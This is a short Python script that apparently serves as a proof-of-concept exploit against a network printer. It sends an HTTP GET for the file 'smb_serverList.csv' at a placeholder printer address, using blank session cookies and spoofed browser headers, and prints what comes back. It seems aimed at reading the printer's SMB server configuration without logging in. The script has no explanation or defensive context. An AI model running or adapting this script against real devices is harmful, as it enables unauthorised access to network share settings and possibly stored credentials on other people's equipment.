import requests
cookies = {
    'Instance': '',
    'FALSE': '',
    'xuser': '',
    'SelectedTab': '',
    'SettingsMenu': '',
    'SelectedMenu': '',
    'SettingsSubMenu': '',
    'SelectedSubMenu': '',
    'JSESSIONID': '',
    'Authentication': ' ',
    'UserRole': '',
}
headers = {
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'DNT': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
}
response = requests.get('http://<PRINTER_IP>/smb_serverList.csv', headers=headers, cookies=cookies, verify=False).text
print(response)